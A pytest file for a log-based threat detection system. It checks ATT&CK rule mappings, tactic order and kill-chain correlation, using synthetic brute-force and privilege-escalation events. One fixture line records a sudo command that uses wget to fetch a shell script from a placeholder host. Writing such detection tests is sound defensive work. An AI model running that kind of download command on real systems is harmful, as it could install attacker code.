import json

import pytest

from core.storage import db
from detection.attack import enrich_job, mapping_for, tactics_order
from tests.test_detection import insert_event


def test_mapping_covers_core_rules():
    m = mapping_for("BRUTE_FORCE_001")
    assert m and m[0]["technique"] == "T1110.001"
    assert mapping_for("MAL_POWERSHELL_001")[0]["tactic"] == "execution"
    assert mapping_for("NO_SUCH_RULE") == []


def test_tactic_order_is_enterprise_sequence():
    t = tactics_order()
    assert t[:3] == ["reconnaissance", "resource-development", "initial-access"]
    assert "impact" in t and len(t) == 14


def test_killchain_progression_built():
    job = "t_attack"
    for i in range(4):
        insert_event(job, ts=f"2026-08-25T20:0{i}:00Z", event_type="auth_failure",
                     src_ip="185.23.45.67", username="admin", status="failure",
                     message=f"failed #{i}")
    insert_event(job, ts="2026-08-25T20:04:00Z", event_type="auth_success",
                 src_ip="185.23.45.67", username="admin", status="success",
                 message="Accepted password for admin from 185.23.45.67")
    insert_event(job, ts="2026-08-25T20:05:00Z", event_type="privilege_escalation",
                 username="admin",
                 message="sudo: admin : COMMAND=/usr/bin/wget http://x.example/x.sh")
    from detection.correlator import build_incidents
    from detection.engine import evaluate_job
    evaluate_job(job)
    build_incidents(job)
    n = enrich_job(job)
    assert n >= 1
    with db() as conn:
        row = conn.execute(
            "SELECT killchain_json, techniques_json FROM correlations WHERE job_id=?"
            " ORDER BY risk_score DESC LIMIT 1", (job,)).fetchone()
        det = conn.execute(
            "SELECT techniques_json FROM detections WHERE job_id=? AND rule_id='BRUTE_FORCE_001'",
            (job,)).fetchone()
    kc = json.loads(row["killchain_json"])
    assert kc["total_stages"] == 14
    tactics_hit = {a["tactic"] for a in kc["achieved"]}
    assert "credential-access" in tactics_hit      # brute force
    assert "privilege-escalation" in tactics_hit   # sudo
    assert kc["stages_reached"] >= 2
    techs = json.loads(det["techniques_json"])
    assert techs[0]["technique"] == "T1110.001"
